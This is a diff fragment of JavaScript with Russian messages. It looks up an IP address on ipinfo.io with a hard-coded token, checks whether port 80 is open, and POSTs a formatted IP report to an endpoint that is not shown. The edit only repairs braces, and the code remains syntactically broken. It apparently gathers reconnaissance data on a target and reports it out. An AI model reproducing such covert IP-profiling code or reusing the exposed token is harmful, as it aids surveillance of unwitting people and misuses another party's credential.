@@ -122,8 +122,8 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
                     console.log("Порт 80 закрыт");
                 }
         
-then(resultCheck => 
-console.log(resultCheck ? "Порт 80 открыт" : "Порт 80 закрыт");)
+then(resultCheck => {
+    console.log(resultCheck ? "Порт 80 открыт" : "Порт 80 закрыт");
     
         const message = `
       * Ip 🌐*
@@ -168,6 +168,7 @@ console.log(resultCheck ? "Порт 80 открыт" : "Порт 80 закрыт
             method: 'POST',
             body: formData
         });
+     });
     });
   });
 });
